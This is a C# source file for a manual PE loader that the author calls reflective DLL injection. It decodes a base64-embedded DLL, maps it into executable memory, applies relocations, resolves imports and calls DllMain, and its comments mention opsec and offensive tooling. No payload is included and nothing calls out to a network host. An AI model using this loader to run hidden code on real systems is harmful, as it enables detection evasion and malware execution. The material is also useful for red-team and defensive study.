/*
x64 Reflective DLL Injection in C#
its awesome but not opsec safe, i'll try to work on memory cleanup shenanigens more
this approach is a little different than Stephen Fewer's approach as it is not SelfReflective (below)
after days of reversing PELoader's and self hatred XD i found that directly accessing the structures in memory is way more easier 
(not easy readable but easy doable)

this code does NOT self reflect because the goal is to inject unmanaged dlls not managed ones
it loads an unmanaged dll, preform relocations and resolves import table and calls DLLMain

 perfect resource to understand the numbers in memory readings
https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
 */


using System;
using System.IO;
using System.Runtime.InteropServices;
using static DInvoke.Data.PE; // contains all PE Structures 



void print(object input) { Console.WriteLine(input); }
void exit() { Environment.Exit(0); }


[DllImport("kernel32")]
static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
static extern IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);


uint MEM_COMMIT = 0x1000;
uint MEM_RESERVE = 0x2000;
uint PAGE_EXECUTE_READWRITE = 0x40;
uint PAGE_READWRITE = 0x04;


IntPtr NULL = IntPtr.Zero;
string b64DLL = "";
byte[] unpacked = Convert.FromBase64String(b64DLL);

IMAGE_DOS_HEADER dosHeader = new();
IMAGE_OPTIONAL_HEADER64 optionalHeader64 = new(); // using x64 bit DLLs only to not kill myself X:
IMAGE_FILE_HEADER fileHeader = new();
IMAGE_SECTION_HEADER[] imageSectionHeaders;
UInt64 IMAGE_ORDINAL_FLAG64 = 0x8000000000000000; // from winnt.h

// CaseySmith's PELoader Constructor, but modified to DInvoke
using (MemoryStream stream = new MemoryStream(unpacked, 0, unpacked.Length))
{
    BinaryReader reader = new BinaryReader(stream);
    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

    // Add 4 bytes to the offset
    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

    UInt32 ntHeadersSignature = reader.ReadUInt32();
    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);


    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);


    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
    {
        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
    }


    byte[] rawbytes = unpacked;

}
static T FromBinaryReader<T>(BinaryReader reader) // CaseySmith's PELoader FromBinaryReader Method
{
    // Read in a byte array
    byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

    // Pin the managed memory while, copy it out the data, then unpin it
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    handle.Free();

    return theStructure;
}


// from here as if i called PELoader(unpacked);

uint SizeOfImage = optionalHeader64.SizeOfImage;
IntPtr codebase = VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// copy sections
for (int sectionIndex = 0; sectionIndex < fileHeader.NumberOfSections; sectionIndex++)
{
    IntPtr SectionAddress = IntPtr.Add(codebase, (int)imageSectionHeaders[sectionIndex].VirtualAddress);
    uint SectionSize = imageSectionHeaders[sectionIndex].SizeOfRawData;
    if (SectionSize != 0)
    {
        IntPtr SectionMemory = VirtualAlloc(SectionAddress, SectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(unpacked, (int)imageSectionHeaders[sectionIndex].PointerToRawData, SectionMemory, (int)SectionSize);
    }
    else { print($"Section {new string(imageSectionHeaders[sectionIndex].Name)} has no size, windows underlying core will take care of it"); }
}

print("[*] Mapped Sections");


// Base Relocations


IntPtr RelocationTablePtr = IntPtr.Add(codebase, (int)optionalHeader64.BaseRelocationTable.VirtualAddress);
IMAGE_BASE_RELOCATION ImageBaseRelocation = new();
ImageBaseRelocation = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(RelocationTablePtr);
int SizeOfBaseRelocation = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
int SizeOfRelocationBlock = (int)ImageBaseRelocation.SizeOfBlock;

IntPtr pRelocationTablePtr = RelocationTablePtr; // honestly don't fuckin know whats the purpose of this --__("")__--


long delta = codebase.ToInt64() - (long)optionalHeader64.ImageBase;
while (true)
{
    IMAGE_BASE_RELOCATION ImageBaseRelocation2 = new();
    IntPtr NextRelocationBlock = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    ImageBaseRelocation2 = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(NextRelocationBlock);

    IntPtr RelocationBlockAddress = IntPtr.Add(codebase, (int)ImageBaseRelocation.VirtualAdress);

    int RelocationEntriesinBlock = (int)((ImageBaseRelocation.SizeOfBlock - SizeOfBaseRelocation) / 2);

    for (int i = 0; i < RelocationEntriesinBlock; i++)
    {
        UInt16 RelocationEntry = (UInt16)Marshal.ReadInt16(pRelocationTablePtr, SizeOfBaseRelocation + (2 * i));
        // dissecting the relocation entry
        UInt16 RelocationType = (UInt16)(RelocationEntry >> 12); // byteshift 12 bits to get the first type indicator 4 bits
        UInt16 RelocationValue = (UInt16)(RelocationEntry & 0xfff); // MASK the first 4 bits, leaves the last 12 relocation bits

        switch (RelocationType)
        {
            case 0x0:
                break;
            case 0xA: //for x64

                IntPtr Patch = IntPtr.Add(RelocationBlockAddress, RelocationValue);
                long OriginalAddress = Marshal.ReadInt64(Patch);
                Marshal.WriteInt64(Patch, OriginalAddress + delta);

                break;

        }

    }

    pRelocationTablePtr = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    SizeOfRelocationBlock += (int)ImageBaseRelocation2.SizeOfBlock;
    ImageBaseRelocation = ImageBaseRelocation2;

    if (ImageBaseRelocation2.SizeOfBlock == 0) { break; }
}
print("[*] performed Base Relocations");


// Resloving Importations

int IMPORT_DIRECTORY_TABLE_ENTRY_LENGTH = 20;
int IDT_IAT_OFFSET = 16;
int DLL_NAME_RVA_OFFSET = 12;
int IMPORT_LOOKUP_TABLE_HINT = 2;

var IMPORT_TABLE_SIZE = optionalHeader64.ImportTable.Size;
int ImportTableRVA = (int)optionalHeader64.ImportTable.VirtualAddress;

int SizeOfImportDescriptor = Marshal.SizeOf<DInvoke.Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR>();
var NumberOfDlls = IMPORT_TABLE_SIZE / SizeOfImportDescriptor;

IntPtr pIDT = IntPtr.Add(codebase, ImportTableRVA);

for (int DllIndex = 0; DllIndex < NumberOfDlls; DllIndex++)
{
    IntPtr pImageImportDescriptor = IntPtr.Add(pIDT, IMPORT_DIRECTORY_TABLE_ENTRY_LENGTH * DllIndex);
    IntPtr dllNameRva = IntPtr.Add(pImageImportDescriptor, DLL_NAME_RVA_OFFSET);
    IntPtr dllNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(dllNameRva));
    string DllName = Marshal.PtrToStringAnsi(dllNamePtr);

    IntPtr Handle2Dll = LoadLibrary(DllName);
    int IAT_RVA = Marshal.ReadInt32(pImageImportDescriptor, IDT_IAT_OFFSET);
    IntPtr IATPtr = IntPtr.Add(codebase, IAT_RVA);

    while (true)
    {
        IntPtr DllFuncNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(IATPtr) + IMPORT_LOOKUP_TABLE_HINT);
        string DllFuncName = Marshal.PtrToStringAnsi(DllFuncNamePtr);
        if (string.IsNullOrEmpty(DllFuncName)) break; // sanity check
        //print($"{DllName} _> {DllFuncName}");
        IntPtr FuncAddress = GetProcAddress(Handle2Dll, DllFuncName);
        var IntFunctionAddress = FuncAddress.ToInt64(); ;
        Marshal.WriteInt64(IATPtr, (long)IntFunctionAddress);
        IATPtr = IntPtr.Add(IATPtr, IntPtr.Size);
    }
}
print("[*] Mapped Importations");




int AddressOfEntryPoint = (int)optionalHeader64.AddressOfEntryPoint;

IntPtr DLLEntry = IntPtr.Add(codebase, AddressOfEntryPoint);

DllMain DllMain = Marshal.GetDelegateForFunctionPointer<DllMain>(DLLEntry);
//DllMain is a delegate and DLLEntry is an unmanaged function pointer that resembles the DLLMain delegate
//DllMain is from D/Invoke LIB
 

print("[*] Callind DllMain with DLL_PROCESS_ATTACH");
bool CallResult = DllMain(codebase, DLL_PROCESS_ATTACH, IntPtr.Zero);



if (!CallResult)
{
    print("[-] calling DLLMain failed");
}
